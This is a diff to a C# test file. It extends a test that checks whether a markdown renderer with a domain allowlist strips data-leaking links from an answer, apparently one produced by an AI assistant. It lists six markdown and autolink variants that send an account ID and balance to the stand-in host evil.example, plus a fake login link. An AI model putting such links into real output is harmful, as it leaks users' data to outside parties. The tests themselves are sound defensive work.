@@ -109,9 +109,18 @@ public static partial class RegisterTests
     // R06
     static Task<bool> ExfiltrationImageIsRemoved(Controls c)
     {
-        const string answer = "Done! ![status](https://evil.example/p.png?d=E-1001-balance-500)";
-        string rendered = c.On("markdown-allowlist") ? new SafeMarkdown(["contoso.example"]).Render(answer) : answer;
-        return Task.FromResult(!rendered.Contains("https://evil.example", StringComparison.Ordinal));
+        string[] answers =
+        [
+            "Done! ![status](https://evil.example/p.png?d=E-1001-balance-500)",
+            "![s](https://evil.example/p.png?d=E-1001-balance-500 \"status\")",
+            "![s]( https://evil.example/p.png?d=E-1001-balance-500)",
+            "![s][1]\n\n[1]: https://evil.example/p.png?d=E-1001-balance-500",
+            "<https://evil.example/?d=E-1001-balance-500>",
+            "[portal](https://evil.example/login 'Contoso portal')",
+        ];
+        SafeMarkdown safe = new(["contoso.example"]);
+        return Task.FromResult(answers.All(answer =>
+            !(c.On("markdown-allowlist") ? safe.Render(answer) : answer).Contains("https://evil.example", StringComparison.Ordinal)));
     }
 
     // R07
